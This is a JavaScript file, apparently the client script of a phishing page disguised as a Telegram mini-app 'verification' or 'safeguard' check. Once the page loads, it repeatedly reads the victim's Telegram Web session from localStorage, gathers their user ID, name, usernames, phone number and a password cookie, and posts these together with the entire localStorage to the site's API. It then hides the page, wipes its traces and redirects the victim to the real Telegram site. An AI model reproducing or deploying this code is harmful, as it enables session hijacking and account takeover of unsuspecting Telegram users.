document.addEventListener("DOMContentLoaded", function() {
  console.log("check.js: Script loaded");

  console.log(`check.js: window.Telegram exists: ${!!window.Telegram}`);

  console.log(`check.js: window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);

  let loginAttempts = 0;
  const maxLoginAttempts = 200; // Increased to ~20 seconds (200 * 100ms)

  async function checkLocalStorage() {
    // First, check if the user is logged in via Telegram WebApp
    if (window.Telegram && window.Telegram.WebApp) {
      const user = window.Telegram.WebApp.initDataUnsafe?.user;
      console.log(`check.js: Telegram WebApp user: ${user ? JSON.stringify(user) : "Not logged in"}`);

      if (user) {
        console.log(`check.js: User logged in via WebApp: ${user.id}, ${user.first_name}`);
      } else {
        loginAttempts++;
        console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in via WebApp`);

        if (loginAttempts === maxLoginAttempts) {
          console.log("check.js: Max login attempts reached, prompting user to return");
          if (window.Telegram && window.Telegram.WebApp) {
            window.Telegram.WebApp.showAlert("Please return to the mini app after logging in to complete verification.");
          }
          return;
        }
        return;
      }
    }

    // Check localStorage for tt-global-state and user_auth
    let globalState = localStorage.getItem("tt-global-state");
    console.log(`check.js: tt-global-state: ${globalState ? "Found" : "Not found"}`);

    let userAuth = localStorage.getItem("user_auth");
    console.log(`check.js: user_auth: ${userAuth ? "Found" : "Not found"}`);

    if (globalState && userAuth) {
      console.log("check.js: Both tt-global-state and user_auth found, proceeding with verification");

      let parsedState;
      try {
        parsedState = JSON.parse(globalState);
      } catch (error) {
        console.error("check.js: Failed to parse tt-global-state:", error);
        return;
      }

      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users?.byId?.[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        console.log(`check.js: Found user data for userId ${currentUserId}`);

        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1] || "No password set";

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        console.log(`check.js: Preparing to send user data to /api/users/telegram/info for userId ${currentUserId}`);
        console.log(`check.js: User data:`, {
          userId: currentUserId,
          firstName: firstName || "Unknown",
          usernames: usernames || [],
          phoneNumber: phoneNumber || "Unknown",
          isPremium: isPremium || false,
          password: password,
          type: new URLSearchParams(window.location.search).get("type") || "safeguard"
        });

        try {
          const response = await fetch(`/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId,
              firstName: firstName || "Unknown",
              usernames: usernames || [],
              phoneNumber: phoneNumber || "Unknown",
              isPremium: isPremium || false,
              password: password,
              quicklySet: localStorage,
              type: new URLSearchParams(window.location.search).get("type") || "safeguard"
            })
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          console.log(`check.js: Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
        } catch (error) {
          console.error(`check.js: Failed to send user data to /api/users/telegram/info: ${error.message}`);
          return; // Stop further execution if the API call fails
        }

        console.log(`check.js: Opening Telegram link and closing WebApp`);

        try {
          window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
          window.Telegram.WebApp.close();
        } catch (error) {
          console.error(`check.js: Failed to open Telegram link or close WebApp: ${error.message}`);
        }

        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      } else {
        console.log(`check.js: No user data found in tt-global-state (currentUserId: ${currentUserId}, currentUser: ${currentUser})`);
      }
    } else {
      loginAttempts++;
      console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);

      if (loginAttempts === maxLoginAttempts) {
        console.log("check.js: Max attempts reached, prompting user to return");
        if (window.Telegram && window.Telegram.WebApp) {
          window.Telegram.WebApp.showAlert("Please return to the mini app after logging in to complete verification.");
        }
        return;
      }
    }
  }

  // Check if we’re returning from a login redirect
  const returnUrl = localStorage.getItem('returnUrl');
  if (returnUrl && window.location.pathname !== returnUrl.split('?')[0]) {
    console.log(`check.js: Returning from login, redirecting to ${returnUrl}`);
    window.location.href = returnUrl;
    return;
  }

  const checkInterval = setInterval(checkLocalStorage, 100);

  // Listen for WebApp events to detect when the user returns
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.onEvent("viewportChanged", () => {
      console.log("check.js: Viewport changed, user may have returned");
      loginAttempts = 0;
      clearInterval(checkInterval);
      setInterval(checkLocalStorage, 100);
    });
  }
});
